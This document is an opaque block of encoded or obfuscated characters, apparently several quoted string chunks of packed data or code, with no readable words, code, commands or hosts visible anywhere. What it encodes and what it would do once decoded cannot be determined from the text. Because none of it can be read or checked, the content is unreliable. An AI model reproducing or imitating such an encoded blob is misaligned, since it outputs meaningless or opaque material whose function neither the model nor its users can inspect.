uJBK|a\"z\"`Y%oJGOibITk`GDjLSpKBZOmaG[wcnFucYWgQUA|\\YznMoOxaI\\mbj%|a\"z\"\\Ui|\\YznMnmv[YcmMBAj[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUlLBSm{\\ZT!bn$gLD%xanWuJIOmaG[w`YSqMB@pVn)w\\Uygb\"Xu\\j%\"[Yz!\\UlLBYTm\\jA\"\\ZKq\\olpb\"Xu\\jl&BglKbnX cZKwJIKmbZXmb#T|MncmcBi|\\YznMnFy`U@tJBKk`GXk`{(jJBugb\"Xu\\j%q\\B@tJBb3cnFucYW)K{@tJIOmaG[wcnFucYWuJIA{a#iq\\ZN)b\"Xu\\j%ybn)$dUyg`GXi\\GX{b|!|\\YznMnim[YTmboNuJI\\mbnmndV!G[Yz|\\UygcGmv\\Y)!cC!|\\YznMmTKVWXQXXSqMnq|a\"$pLXujbnX|cYz Jm gQV gNSqkaGF|b{AP\\ZcSa#O PgpK\\GXnJF)f`Y%qcF)fLIOmaG[uJIA{a#i%MBAi\\\"XwcByg[n)ibnSuJITpbnXi\\Bygb\")ucnX{MBAk[ZA [\"iiXImy\\Ul&BglKb\"Xu\\j%ybn)$dU@)JIuj`IT bBJ&JIA{a#i%MB@j`IT bINjPjAybn)$dZ LBSm|\\YznMnFo\\Y% JC gd{KXb\"X{MWFo\\Y% Jkpg[YcmaoT)BglKb\"Xu\\j%ja\"F{\\B@)JGKx[ZKlBglKb\"Xu\\j% `IKm[YSgQUA `IKm[YSLBSm|\\YznMoOxaI\\mbj@)JIOxaI\\mbgpKBZOmaG[w[\"FycGOp[XT%bGWgQUAk[ZA [\"iiXImy\\SpKBZOmaG[w[oXn\\nX{JC gd# LBSm|\\YznMoAibnFvb{@)JFvcBglKb\"Xu\\j%y[ZKiaZNw[ZAy\\Y%lLBgjcGF|`{JuJBiPa\"%mMB@jbG)|cBJqLUlLBSm|\\YznMoAibnFvb{%ibIAmanSpLBKja\"F{\\BJuJBiPa\"%mMBA|\\YznMnKx[ZKlLUlqBglKb\"Xu\\j%y[ZKiaZNw[ZAy\\Y%lLBgjcGi{\\YFlJjygLD%xanWuJIOmaG[wcGi{\\YFlLUlqBglKb\"Xu\\j%y[ZKiaZNw[ZAy\\Y%lLBgjcZOmbnOx\\GWjMB@pVn)w\\UygJjJqLUlLBSm|\\YznMoAibnFvb{%ibIAmanSpLBKka\"TmJjygLD%xanWuJBJjLUlqBglK`Y[gb\"Xu\\j%k[ZA [\"iiXImy\\U@)QU@jNnOpJkpLBSlKb\"Xu\\j%y[ZKiaZNw[ZAy\\Y%lLBgj[\"FycGOp[X) dZAmJjygLD%xanWuJBJ{[\"iibITk`GDjLUlqBglK\\Yz|\\VpLBSlKb\"Xu\\j%y[ZKiaZNw[ZAy\\Y%lLBgj[\"FycGOp[X) dZAmJjygLD%xanWuJBK{\\YOibITk`GDjLUlqBglKb\"Xu\\j%y[ZKiaZNw[ZAy\\Y%lLBgja\"Xt[YvqZ\"mv[YcmJjygLD%xanWuJBJjLUlqBglKb\"Xu\\j%y[ZKiaZNw[ZAy\\Y%lLBgja\"Xt[YvqZ\"!mcGFl[ZTiJjygLD%xanWuJBJjLUlqBglKb\"Xu\\j%|\\ZTf`GXi\\GX{b{gqBgml\\Y[gb\"X Z\"im[YTmboNpb\"Xu\\jl&BglKb\"Xu\\j%p\\YFl\\ZK|JC gd# LBSm|\\YznMnim[YTmboOaJlixb#SjZU@)JBJ{[\"gw`GujBglKb\"Xu\\j%p\\YFl\\ZK|MoXy\\GF \\Ui|\\YznMnFo\\Y% LSpKBZOmaG[w`GXi\\GX{b!ujSYOk\\ZA Jm gQU@j[ZAyaGmk[ZTqa\"$x`oOxajygcGX$cB)s[Z\\ib\"O `ZA MB@sM{p\'JID)NB$yNUJLBSm|\\YznMnim[YTmboOaJlFk[\"XycB!N[Y%ocYFo\\UKcJC gJoK!MXKXMIK!P#D)NB$$MGXwMXXVP#D)NB$!MGXwP#D)NB$|JgpKBZOmaG[w`GXi\\GX{b!ujSYOk\\ZA MWXw[\")l`Y%oJm gQU@j\\#qqbByg\\GXnaGF \\Uyg[oJjBglKb\"Xu\\j%p\\YFl\\ZK|Y{KU\\Y\\mbnX{Jm gQUA|cIJpJni cIA|Pj(xNnOpMnitM{JgL{A|\\YznMnKx[ZKlJBugJj){\\ZNxJj@tJIOmaG[wcGi{\\YFlJBugJj%pcG!uJjlLBSm|\\YznMnim[YTmboOaJmgvWnXzcYX|cGXlMXcqcGgjZU@)JBK[VWzJcITyWnXzcYX|cBJLBSm|\\YznMnim[YTmboOaJlOxaoTmaoSvVGXw\\#TpJm gQUA|cIJpNVWyNC@yNC@gL{A{[Y%la\" wbnFw\\GmwcBgyMB@zNC@qLSpKBZOmaG[w`GXi\\GX{b!ujS\")x`\"mmJm gQU@jJgpKBZOmaG[w`GXi\\GX{b!ujS\")wanXkcGmxajKcJC gJnvm\\Z@v[YzqcnWjBgml\\Y[gbIKmbGF{\\Ui|\\YznMBAWUW!FV!XWLVpLBSm bol&BglKBZOmaG[w[oXn\\nX{Y{Kk`GFycGOp[X)q\\BKcMBA|\\YznMnK!\\n\\mbmuj[\"iibITk`GFfcnFu",
    "cYWjZU@)JDOibITk`GDpb\"Xu\\j%ybn)$dUygb\"Xu\\j%i\\\"XwcBygb\"Xu\\j%ja\"F{\\Bygb\"Xu\\j% `IKm[YSuJIOmaG[wb\")ucnX{MBAWUW!FV!XWMBA|\\YznMnOibITk`GFWdZAmLU%|a\"z\"\\UgqBglKBYmnJIOmaG[w[\"FycGOp[XT%bGWgQV gJkKk`BJ&BglKBSm|\\YznMoAibnFvb{%ibIAmanSpLBJ{[\"iibITk`GFf`YSjMBA|\\YznMnK!\\n\\mbmuj[\"iibITk`GFf`YSjZUlqBglKBSm|\\YznMoAibnFvb{%ibIAmanSpLBJ{[\"iibITk`GFfcnFucYWjMBA|\\YznMnK!\\n\\mbmuj[\"iibITk`GFfcnFucYWjZUlqBglKBYXub\"W&BglKBSm|\\YznMoAibnFvb{%ibIAmanSpLBJ{[\"iibITk`GFf`YSjMBA|\\YznMnK!\\n\\mbmuj[\"iibITk`GFf`YSjZUlqBglKBSm|\\YznMoAibnFvb{%ibIAmanSpLBKoMZKm[\"FycGOp[U!{\\ZOya\"%|\\UJuJIOmaG[w[oXn\\nX{Y{Kk`GFycGOp[X)\"[Yz!\\UKcLUlLBSlKbIKqaoSpb\"Xu\\j%ybn)$dXuj`IT bBKcMB@jb\")ucnXlJjlLBSlKbnX cZKwJFT{cYWLBSmmdGOmbISgTZik\\ZA `Y)wJGF|JGW&BglKBZKmcIX{ajAG[Yz|\\SpK\\GXnJIOmcF)|cYKs\\YO LIOmaG[uJITmdISqPgpKBZOmaG[wbGF{[Y!|MnFybGXw\\BgpJoO![nqm[#SjMB@pVn)w\\UygcGX$cBlqLSpK\\GXnJIOmcF) \\Zi LIOmaG[uJITmdISqPgpKBZOmaG[wbGF{[Y!|MnFybGXw\\BgpJnOxaY!maoSjMB@pVn)w\\UygcGX$cBlqLSpK\\GXnJIOmcF)|[YcmLIOmaG[qPgpKBZOmaG[wbGF{[Y!|MnFybGXw\\BgpJnXv[YmuJjygLD%xanWuJBK|[YcmJjlqLSpKBZOmaG[wbGF{[Y!|MnFybGXw\\BgpJoOi\\\"WjMB@pVn)w\\UygJn)wJjlqLSpK\\GXnJIOmcF)qaYFo\\Ui|\\YznMBAn`YzmZ\"%iaYWuJIOp[YviaFAxc\"X{QV@uJIOp[YviaDOxaG){QW\\iaIOmMBA|`GFt[YzA\\n\\qanW)TnFub\"WuJITxWD%IQW\\iaIOmLVpLBSmqaYFo\\U@)JIOmaG[wb\"ii`\"FuLG\\qaGXfanFv\\Uygb\"ii`\"FuWG)#\\ZJuJIOp[YviaDOxaG){MBA|`GFt[YzA\\n\\qanWuJITxWD%ILSpKBY\\qaGXfanFv\\X)l`ZOyaGF%\\YSgQUA|cIJpK{bw`n)qaji|cIJpbnFw\\G)vMoKianTqaoSpNBygPUlqJG\\xbjAfJGmwJIKiancmLD%AVWXfW m`TU zLUlgL{@jNBJqBglK`Y[gcG)SVlb&JG\\qaGXfanFv\\X)l`ZOyaGF%\\YSgL| gJj%yanbjBglK\\Yz|\\Vpg\\nmu\\X)w[Y!mZ\"Tqb#Au[Zmm\\B@tQU@jMnqy\\{JLBSm|\\YznMoAibnFvb{%ibIAmanSpLBKna#Kv`Y!i\\\"X|Y! jMB@p\\nmu\\X)w[Y!mZ\"Tqb#Au[Zmm\\Byg`Y!i\\\"WuJBKqaYFo\\U)sbGXoJjlqLSpK\\GXnJIOmcF)\"`YTma{i|\\YznMBAn`YzmZ\"%iaYWqPgpKBYmnJG\\qaGXfanFv\\U%n`Y%lLBJwaZ@ JjlgJV gMVD&JGX$cB@)JBKvbCSjBglK\\Yzq\\jAn`YzmZ\"%iaYWw\\nmw\\BgjMocm[n jLU@iQU@vNVpg\\Zi JC gJocm[n jBglKcnml\\Y(gQUAxbGXwLG\\qaGXfanFv\\UygJoKjJjlLBSm\"`YTma!)jdZTmb{@)JI\\q\\GXxMoKm[YSpLSpKBZ\\q\\GXxMnOua#OmLBlLBSmn`YzmZ\"%iaYXf\\Gm|bGzidYXlJC gb#T{LBboMnqx`Y$pb#T{LIKianTxaU%{[Y%l`Y% LC@uJClqLUAna#JgZ{AqajA{[Y%o\\UiPSW!FZ!OKYlWvNUlqJBugJk@jLSpKBY\\qaGXfanFv\\X)l`ZOyaGF%\\YSgL| gb#T{LBJwJj@tJGX$cBlLBSm|\\YznMoAibnFvb{%ibIAmanSpLBKna#Kv`Y!i\\\"X|Y! jMB@p\\nmu\\X)w[Y!mZ\"Tqb#Au[Zmm\\Bygcnml\\Y)f[om \\ZNuJIO bjgjcnml\\Y(xJj@tJGX$cBlqLUlLBYTm\\jA|\\ZTfaYXl`YDpb\"Xu\\jygaYXl`YFP[Y!mMBAv\\YTq[Uygb\"ii`\"FuWG)#\\ZJ)NBygb\"ii`\"FuS\")ua#J)TnFub\"WuJIOp[YviaDFn\\nmw\\V!G[Yz|\\UygcG)SVlb)TnFub\"WqPgpKBY\\qaGXfanFv\\X)l`ZOyaGF%\\YSgQUA|cIJpK{bw`n)qaji|cIJpbnFw\\G)vMoKianTqaoSpNBygPUlqJG\\xbjAfJGmwJIKiancmLD%AVWXfW m`TU zLUlgL{@jNBJqBglK`Y[gaYXl`YFP[Y!mMn\\qanSpJj%sbGbjLU@iQU@vNUAxbjAv\\YTq[W%iaYWw\\nmw\\BgjMoAw\\{JqJBD)JB zJG){JG!m\\GmiVnFv\\U%n`Y%lLBJw\\\"mnJjlgJV gMVDga#JgaYXl`YFP[Y!mMn\\qanSpJj%jaZ@jLU@iQU@vNVpLBSlKaYXl`YDgQUA|\\YznMoOp[YviaBiqa{%BdZTmb mQLG!m\\GmiLUygb\"ii`\"FuWG)#\\ZJuJIOp[YviaDOxaG){MBA|`GFt[YzA\\n\\qanWuJITxWD%ILSpKBSmq\\jA a!APT|pLBSlKBY!m\\GmiXImy\\U@)JBKqaYFo\\U)yanbjBglKBSmn`YzmZ\"%iaYXf\\Gm|bGzidYXlJBu)JBJwbG%oJgpKBSmmaIOmPgpKBSlKaYXl`YFWdZAmJC gJnmv[YcmM\"qy\\YbjBglKBSmn`YzmZ\"%iaYXf\\Gm|bGzidYXlJBu)JBJw`oAoJgpKBYXu`Y[gaYXl`YFP[Y!mMn\\qanSpJj%vbCSjLU@iQU@vNVpLBSlKaYXl`YFWdZAmJC gJo\\q\\GXxM\"!yOBJLBSlK\\nmu\\X)w[Y!mZ\"Tqb#Au[Zmm\\B@tQU@jMn!yOBJLBSmmaGmnJG!m\\GmiVnFv\\U%n`Y%lLBJwc\"XjaUJqJBD)JB zPgpKBSmv\\YTq[XT%bGWgQU@jcnml\\Y(xc\"XjaUJLBSlK\\nmu\\X)w[Y!mZ\"Tqb#Au[Zmm\\B@tQU@jMocm[n jBglK\\Yz|\\VpLBSlKaYXl`YFWdZAmJC gJnmv[YcmJgpKBSmn`YzmZ\"%iaYXf\\Gm|bGzidYXlJBu)JBJw`oAoJgpKBZOmaG[wbGF{[Y!|MnFybGXw\\BgpJn\\xbn!qaYFo\\ZOaZUJuJBin`YzmZ\"%iaYXf\\Gm|bGzidYXlMBAv\\YTq[UygaYXl`YFWdZAmLUlqBgml\\Y[gb\"ii`\"FuLIOmaG[uJGmv",
    "[YcmMBAya#cmbjyg[\")ua#J)TnFub\"WuJGFn\\nmw\\V!G[Yz|\\UygcG)SVlb)TnFub\"WqPgpKBYmv[YcmJC gWDmNMlmv[YcmMn)y\\Y$p`Y!i\\\"WqMnOxao\\mboSpJmKISlDjLSpKBZcq\\ITpMBAp\\Ymo`ISgQUAqaYFo\\U%|`ZqmBglK\\n){JIgg`Y$gbnFw\\\"WpbG)#\\ZJqPjAqaYFo\\U%ycZTy`ZimaBgpbnFw\\G)vMoKianTqaoSpNBygc\"mlcGgvNUluJIKianTxaU%{[Y%l`Y% LC@uJGim`YcpcB zLUluJBi{[Y%la\" wbnFw\\GmwcBgyMB@{OVWqMBA{[Y%la\" wbnFw\\GmwcBgyMB@{OVWqMBA{[Y%la\" wbnFw\\GmwcBgyMB@{OVWqLUlLBSmq\\jAka\"zxbkpLBSlKbnXlJC gbnFw\\G)vMoKianTqaoSpNBygNkW!LSpKBSml`Y[gQUAi[oNpbnXlJB gNVJ#LSpKBSmobnXmaj@)JIKianTxaU%{[Y%l`Y% LC@uJGTq\\jlLBSlK`Y[gbnFw\\G)vMoKianTqaoSpNBygNUl&JGc{\\YXwJC gNkW!JB g\\#Km\\Y$LBSlK[nz!\\U@)JIKianTxaU%{[Y%l`Y% LG!idBgyMB@{OVWvbnXlMYc{\\YXwLUygaYmwLCJ!OUygOVDyMZKm\\B!obnXmajlqBglKBYmnJIKianTxaU%{[Y%l`Y% LC@uJCDqPjA{\\YSuJGc{\\YXwJC g\\#Km\\Y$uJIKm\\@pKBSmq\\jA{[Y%la\" wbnFw\\GmwcBgyMB@zLVpgbnXlMBAjaIXmJC g[nz!\\UygbnXlBglKBYmnJIKianTxaU%{[Y%l`Y% LC@uJCDqPjAjaIXmMBAobnXmaj@)JGc{\\YXwMBAjaIXmBglKBYzidYX{JC gWDmNMlmv[YcmMn%mc{gjWlcBSUJuJGmv[YcmMoOqdnWuJBi{\\YSuJGc{\\YXwMBAjaIXmMB@\"OUlqBglKBYmv[YcmMoAib#TmLGzidYX{MB@pNBygNBluJGzidYX{LSpKBYmnJGFn\\nmw\\VpLBSlKb\"ii`\"FuJC gLCDgL{A{[Y%la\" wbnFw\\GmwcBgyMB@zNC@qM|DyNC@gMU@yMk@!MB@yJBugbnFw\\G)vMoKianTqaoSpNBygNV@yLU(zNC@yJB gNB$yOUygNU@tJIKianTxaU%{[Y%l`Y% LC@uJCDyNBlxNV@yNB@vJC@wNCWuJC@gL{A{[Y%la\" wbnFw\\GmwcBgyMB@zNC@qM|DyNC@gMU@yMk@!MB@zJBugbnFw\\G)vMoKianTqaoSpNBygNV@yLU(zNC@yJB gNB$yOUygNB@tJIKianTxaU%{[Y%l`Y% LC@uJCDyNBlxNV@yNB@vJC@wNCWqBglKBYmv[YcmJC g`Y!i\\\"WwcIKiaoOna#KvLGmv[YcmMoOqdnWuJFAKVB%KaYFo\\U%ATl\\KVlWuJIOp[YviaBygbnX|[Y!yaGW)WDmNMlmv[YcmMlKKS!XBUWNqBglK`Y!i\\\"WgQUAqaYFo\\U%kbn)yLBi{[Y%la\" wbnFw\\GmwcBgyMBAya#cmbjluJIKianTxaU%{[Y%l`Y% LC@uJIAxc\"X{LUygc\"mlcGgvNU@vJIKianTxaU%{[Y%l`Y% LC@uJIAxc\"X{LUyg`GXq\\\"i MVDgMUA{[Y%la\" wbnFw\\GmwcBgyMBAya#cmbjlqLSpKBYmnJITxWD%IPgpKBSmqaYFo\\X)jdZTmb{@)JGmxMlK%cGX|UW(pLSpKBSmqaYFo\\U%|[Z\\mLGmv[YcmZ\"K%cGX|MB@jWD%IJjygbZXiaGm dV {NB@tJIKianTxaU%{[Y%l`Y% LCDyMB@|NBluJG)ycGmv`ZqmQYKxa\"ypbnFw\\G)vMncmcIKianTj`ZT|LCDqLUygbIKx\\#Kmb#OqcnW)[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqLSpKBYXub\"W&BglKBYmv[YcmJC g`Y!i\\\"Ww[\")wcnX{cBgjWlcBJjlLBSlK`Y!i\\\"Xf[om \\ZNgQUAqa{%BdZTmb mQLBlLBSlK`Y!i\\\"Wwb\"F\"\\UiqaYFo\\X)jdZTmb{ygJlqSTWbjMBAzcYFu`ZT%QV[yJBugbnFw\\G)vMoKianTqaoSpNV@uJCNyLUyga#A `Y!qdnW)[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqMBAybn)obnX|b\"m\"\\V!ja\")uLIKianTxaU%o\\ZT{[Y%l[nm b{gzLUlqBglK`Y!i\\\"Ww[\"zxb\"WpLSpKBZKmcIX{ajAqaYFo\\X)jdZTmb{%o\\ZT\"[Yz!\\UgqBgml\\Y[gb\"Xw\\Bi|\\YznMBAWUW!FV!XWMBASSXXVTUl&BglKbnX|bG)wb\"WgQUA\'fSpKBZT{dVpLBSlKbIKqaoSpb\"Xu\\j%ybn)$dXuj`IT bBKcMB@jbG)|cGmw\\{JqBglKBZci`ZTfcGmv\\U@)JIKianTxaU%{[Y%l`Y% LC[uJCD!LSpKBSm `Y!mMoOu\\YXyLFAAXXOFLSpKBSm{\\ZOya\"%|\\U@)JIKmbZXmb#T|MoAxb#SpJni cIA|Pj(xNnOpMnitM\"!i`\"Fj[U)ya#O `Y%oMn\\k\\\"l3`oOxak zJjyg\\nmu\\ZN)b\"Xu\\j%y[ZKiaZNuJIA{a#iq\\ZN)b\"Xu\\j%ybn)$dUyg`GXi\\GX{b|!|\\YznMnim[YTmboNuJITqaYXxcZS)XDmOTW)XXBygcnX{`Y\\%QW\\iaIOmLU%sb\")wLBlLBSlKW#TicINw`Y%kWG)|cINpLSpKBSmVcGF b{%ybnmwcFO [ZT|LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBSm{\\ZT!bn$gbnX|bG)wb\"XaK!O [ZT!b{ccJC )JBcQU{buJIKmb#AxaoOmBglK\\Zik\\ZA JDX$[\"XycGmxajAib{AmPgpKBSm{\\ZT!bn$gTnFub\"WuJIKmb#AxaoOmBnOu[ZO|JFcqbGX{PgpK\\GXnJF)f`Y%qcF)fLIOmaG[uJIOmcIXyMBAk[ZTiaG)oMBA `IKm[YT|LVpLBSmybnmwcBgjZG\'Sm)BSJOBT LQSocBWJOB[JOBi KCSl)BkMBCSm)BSJOBo KZSpcBj Lyg Kgg K\'SpvBU KCSl)BkJUJqBglKb\"Xu\\j%ybn)$`YX|JC gY#A{a#i%Y|pvNX g\\n){JIA{a#i%JGmwJG)y\\Y$pJoA{a#iq\\ZNjMB@jbjJqMoKm[YTu`Y%mb{gqZSpKBZKianTxaU%|`IXn\\nzmLIOmaG[wbIKxdGmmb{lLBSmVcGF b{%|\\ZTSbn)$`YX|LGzmaji|\\YznMoA{a#iq\\ZNqLSpKBZOmaG[w[YcmaoT|JC gY\"Fo\\Y% Y|pvNX g\\n){JGFo\\Y% JGmwJG)y\\Y$pJoX|\\ZKi\\\"XwcINjLU%{\\YFlaGmw\\ZNpLX LBSm|\\YznMnKx[ZKlJC gb\"X cZ@w[n)ibnSL",
    "BSm|\\YznMoTpbnXi\\B@)JIOmcIXyMoTpbnXi\\@pKBZOmaG[wb\"X cZ@gQUA|\\ZT!b@pKBZOmaG[w[\"F [Yzx\\{@)JGOicGFua\"bLBSm|\\YznMoTpbnXi\\INgQUA `IKm[YT|BglKb\"Xu\\j%|\\ZTfb\")ucnX{LIOmcIXyMoOxaI\\mbjlLBYTm\\jA|\\ZTfb\")ucnX{LIOmaG[uJIOxaI\\mbjl&BglK[\"FycGOp[U@)JIKmbZXmb#T|MncmcBgj`IT bIN&M{({[\"gw`Gux[ZAqM\"OibITk`GDxNnOp[ZA [\"iiM\"mlQ\"Kx[ZKlQYJncGi{\\YFlQV@jMBAp\\YFl\\ZK|QZujXZOmbj!A\\\"XwcBJ&JIOmaG[w[YcmaoT|Y|AcfUygcGmv\\Y)!cC!|\\YznMoOmcIXyMmTKVWXQXXSuJI\\mbnmndV!G[Yz|\\Ulw`oOxajgqBglK[\"FycGOp[WmDJC g[\"FycGOp[Xuj`YSjZSpKBYmv[YcmJC gbnXzcYX|cINw\\\"X LBKpcITyb|pxM|Kk`B%p`{)ibGlx[\"FycGOp[U({[\"iibITk`GDx`Y!i\\\"WxJj@tJGOibITk`GFKTByg`GXi\\GX{b|!\'JmX|\\ZJvSYcmaoSjPjA|\\YznMnFo\\Y% b!uyZZ uJITqaYXxcZS)b\"Xu\\j%|\\ZT!bB%WUW!FV!XWMBA\"\\ZKq\\ol)TnFub\"WqMnOxaoTmaoSLBSmmboKxbj@)JG)y\\Y$pJnX{bn){Mncq\\jJuJoKjJjlLBSmq\\jAWboXmPjOqaYFo\\U@)QUAmboKxbj%{\\YFlLBl&BglKBZOmaG[w[\"FycGOp[XT%bGWgQU@jbnWjBglKBYmnJIOxaI\\mbj@)QU@yPgpKBSlKb\"Xu\\j%|a\"z\"\\ZJgQUAC[ZA [\"iiW\")ucnX{Z!iC[ZA [\"iiZ#KmLIOmaG[wb\"X cZ@w`\"X%MBA|\\YznMoOmcIXyMnvmdZKmbUlLBSlK\\Yzq\\jA|a\"z\"\\ZJgQV gNVpLBSlKBZOmaG[wb\")ucnX{JC gS\"FycGOp[XOxaI\\mbm)k[ZA [\"ii\\#X{cX){\\Ui|\\YznMoOmcIXyMnvmdUygb\"Xu\\j%|\\ZT!bB%t\\Zm{\\ZDqBglKBYXu`Y[gb\")ucnX{JC )JCJ&BglKBSm|\\YznMoOxaI\\mbj@)JDOibITk`GFVa\"z\"\\ZKf[Y% `YOibITk`GFfbnWpb\"Xu\\j%|\\ZT!bB%t\\ZluJIOmaG[wb\"X cZ@w`\"X%bnXzLSpKBYXub\"W&BglKBZOmaG[w[\"FycGOp[XT%bGWgQU@jNnOpJgpKBSmq\\jA|a\"z\"\\ZJgQV gNCpLBSlKBZOmaG[wb\")ucnX{JC gS\"FycGOp[XOxaI\\mbm)[S\"FycGOp[X({[\"gpb\"Xu\\j%|\\ZT!bB%t\\ZluJIOmaG[wb\"X cZ@w`\"X%bnXzLSpKBSmmaGmnJIOxaI\\mbj@)QU@zPgpKBSlKb\"Xu\\j%|a\"z\"\\ZJgQUAC[ZA [\"iiW\")ucnX{Z\"OibITk`GFocZK!Z|Kk`Bi|\\YznMoOmcIXyMnvmdUygb\"Xu\\j%|\\ZT!bB%t\\Zm{\\ZDqBglKBYXu`Y[gb\")ucnX{JC )JCJ&BglKBSm|\\YznMoOxaI\\mbj@)JDOibITk`GFVa\"z\"\\ZKf[Y% `YOibITk`GFfNnOpLIOmaG[wb\"X cZ@w`\"X%MBA|\\YznMoOmcIXyMnvmdZKmbUlLBYTm\\jA bnFyZ#KmbGzi[\"Wpb\"Xu\\jygcGX$cBl&BglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSlBJuJBKAJjlwbnXyaGFk\\Ugj M@jMB@j[UJqBglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSmUJuJBKFJjlwbnXyaGFk\\Ugj MWjMB@j\\UJqBglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSojJuJBKQJjlwbnXyaGFk\\Ugj M$jMB@ja{JqBglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSpBJuJBKSJjlwbnXyaGFk\\Ugj [@jMB@jbBJqBglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSpUJuJBKCJjlwbnXyaGFk\\Ugj [DjMB@j[{JqBglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSqUJuJBK[JjlwbnXyaGFk\\Ugj [WjMB@jdBJqBglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSljJuJBKBJjlLBSmq\\jAja\")uLIKianTxaU%o\\ZT{[Y%l[nm b{gzLUl&BglKBZTmdISgQUA \\Zi MoKmbGzi[\"WpJvBbJjygJl jLSpKBYmnJGKxa\"ypbnFw\\G)vMncmcIKianTj`ZT|LCDqLVpLBSlKcGX$cB@)JITmdISwbnXyaGFk\\Ugj K jMB@jUBJqBglK`Y[g[n)xaBi{[Y%la\" w\\\"X bnFw\\GKqcINpNUlqPgpKBSm \\Zi JC gcGX$cB%{\\ZAu[YOmLBMSpjJuJBKWJjlLBSmq\\jAja\")uLIKianTxaU%o\\ZT{[Y%l[nm b{gzLUl&BglKBZTmdISgQUA \\Zi MoKmbGzi[\"WpJvGCJjygJoljLSpKBZKmcIX{ajA \\Zi Bgml\\Y[gb\"Xw\\F)ya#O LIOmaG[qPgpKBYmnJBiu\\Y$pb\"Xu\\j%ybn)$`YX|LU@)QU@yLVpgbnX cZKwJD\\iaIOmBglKbIKxdIlgQUA|\\YznMoA{a#iq\\ZNwbG)yLC@qBglK[YcmaoSgQUA{[Y%la\" w[\"ix`YOmLIOmaG[w[YcmaoT|LSpKBZKmb#AxaoOmJC gd{KFboKxbjJ&JBKybn)$dUK)BglK[\")!aoTmbj@)JC@LBSm bol&BglKBZcp`YzmJGOxcY% \\ZJgQBA|\\YznMoOmcIXyMoA{a#i%WnXy\\YF b OxcY% PgpKBSlK`Y[gb\"Xu\\j%|\\ZT!bB%|`IKibG%maDOp[ZKo\\U@)QU@yPgpKBSlKBZTpbnXi\\D%!aU@)JC@LBSlKBSmq\\j@pb\"Xu\\j%|\\ZT!bB%k`GFxb{@)QU@jMVDjLVpLBSlKBSlKcGi{\\YFlJC gb\"Xu\\j% `IKm[YT|Y|AcBglKBSlK\\Yz|\\VpLBSlKBSlKcGi{\\YFlJC gb\"Xu\\j%|\\ZT!bB% [ZKo\\ZTW`IKm[YSLBSlKBYXub\"W&BglKBSlKcGi{\\YFlVoXvJC gbnFw",
    "\\G)vMoKianTqaoSpNBygb\"Xu\\j%|\\ZT!bB%|`IKibG%maDOp[ZKo\\U zLSpKBSlKBYmnJBi|\\YznMoOmcIXyMnOp[Y)|JC )JBJvNUJqPgpKBSlKBSm `IKm[YSgQUA|\\YznMoTpbnXi\\IOacGi{\\YFlVoXvZSpKBSlKBYXu`Y[gLIOmaG[wb\"X cZ@w[\"iia#NgQV gJk@jLVpLBSlKBSlKcGi{\\YFlJC gb\"Xu\\j% `IKm[YT|Y#KianTxaU%{[Y%l`Y% LC@uJGzmaji|\\YznMoTpbnXi\\INqMVDqZSpKBSlKBYXub\"W&BglKBSlKBZTpbnXi\\B@)JIOmaG[wb\"X cZ@wcGF{\\\"X XGi{\\YFlBglKBSmya#O JC gVnX#WG)|cBiybn)$dUyg[YcmaoSuJIOmaG[w[n)ibnSuJITpbnXi\\B%KTBygb\"Xu\\j%|a\"z\"\\ZJuJIOmaG[w[\"FycGOp[XT%bGWqBglKBSmq\\j@pbG)|cB%ybnXy[ZKmLIOmaG[wb\"X cZ@wXDmOTW)XXBlqPgpKBSlKBYOp[ZKwcY gQUA{[Y%la\" wbnFw\\GmwcBgzMB@zNC@qBglKBSlK`Y[gb\"Xu\\j% `IKm[YSgJV gJk@jPgpKBSlKBSmjaGFk`!)iaoX|JC gbnFw\\G)vMoKianTqaoSpNUygaGXwLITpbnXi\\B%ya#O b{lvNUlLBSlKBSlKc\"iqcGXf[Y%!b{@)JIKianTxaU%{[Y%l`Y% LC@uJGzmaji|\\YznMoTpbnXi\\IOacGi{\\YFlVoXvZU%ya#O b{lvNUlLBSlKBSmq\\jA|\\YznMoOmcIXyMoT{`Yco\\ZKGa#KvJC )JCD&BglKBSlKBZT{`Yco\\ZJgQU@jQk$jJBugcGi{\\YFlMnzib#TKTB@tJBcbajbLBSlKBSmmaGmnJIOmaG[wb\"X cZ@wcIKq\\\"cmbl\\xbn gQV gNkpLBSlKBSlKcIKq\\\"cmbj@)JBJ1QjJgL{A `IKm[YSwbG)|cIOa[nzi[\"vf[Y%!b! wUWSgL{@oZG$oBglKBSlK\\Yzq\\jA|\\YznMoOmcIXyMoT{`Yco\\ZKGa#KvJC )JCN&BglKBSlKBZT{`Yco\\ZJgQUA `IKm[YSwaG)i\\j@tJBcbajbLBSlKBSmmaGmnJIOmaG[wb\"X cZ@wcIKq\\\"cmbl\\xbn gQV gOCpLBSlKBSlKcIKq\\\"cmbj@)JBJ1QjJgL{A `IKm[YSwbG)|cIOaNF wUWSgL{@oZG$oBglKBSlK\\Yzq\\jA|\\YznMoOmcIXyMoT{`Yco\\ZKGa#KvJC )JC@&BglKBSlKBZT{`Yco\\ZJgQU@jJgpKBSlKBYmnJIOmaG[wb\"X cZ@waY)l\\U@)QU@zPgpKBSlKBSmya#O MoOmcF) \\Zi LIT{`Yco\\ZJgL{A|\\YznMoOmcIXyMoAib#Tmb!v{[Y%la\" wbnFw\\GmwcBgyMB@%LX 